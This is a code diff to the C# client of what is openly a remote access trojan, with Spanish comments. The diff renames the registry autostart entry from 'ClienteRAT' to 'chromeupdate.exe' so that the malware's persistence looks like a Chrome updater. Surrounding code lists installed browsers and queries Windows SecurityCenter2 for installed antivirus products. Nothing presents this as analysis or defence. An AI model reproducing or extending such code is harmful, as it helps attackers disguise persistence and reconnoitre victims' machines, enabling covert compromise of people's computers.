@@ -2,8 +2,7 @@
 using System.Diagnostics;
 using System.Management;
 using System.Text;
-using System.Data.SQLite;
-using System.Runtime.InteropServices;
+
 
 
 namespace Client.Util
@@ -57,8 +56,6 @@ namespace Client.Util
                     browsersList.AppendLine($"{browserPath,-55} ");
                 }
             }
-
-     
             return browsersList.ToString();
         }
 
@@ -110,17 +107,16 @@ namespace Client.Util
                         // La clave no existe, crearla
                         using (RegistryKey newKey = Registry.CurrentUser.CreateSubKey(keyName))
                         {
-                            newKey.SetValue("ClienteRAT", executablePath);
+                            newKey.SetValue("chromeupdate.exe", executablePath);
                             Debug.WriteLine("Entrada de registro creada con éxito.");
                         }
                     }
                     else
-                    {
-                        // La clave ya existe, actualizar el valor si es necesario
-                        object existingValue = key.GetValue("ClienteRAT");
+                    {   // La clave ya existe, actualizar el valor si es necesario
+                        object existingValue = key.GetValue("chromeupdate.exe");
                         if (existingValue == null || existingValue.ToString() != executablePath)
                         {
-                            key.SetValue("ClienteRAT", executablePath);
+                            key.SetValue("chromeupdate.exe", executablePath);
                             Debug.WriteLine("Entrada de registro actualizada con éxito.");
                         }
                     }
@@ -139,8 +135,7 @@ namespace Client.Util
             StringBuilder antivirusList = new StringBuilder();
 
             try
-            {
-                // Especifica el ámbito de búsqueda
+            { // Especifica el ámbito de búsqueda
                 ManagementScope scope = new ManagementScope(@"\\.\root\SecurityCenter2");
                 scope.Connect();  // Conectar al ámbito
 
@@ -175,8 +170,6 @@ namespace Client.Util
 
             return antivirusList.ToString();
         }
-
-   
 
     }
 }
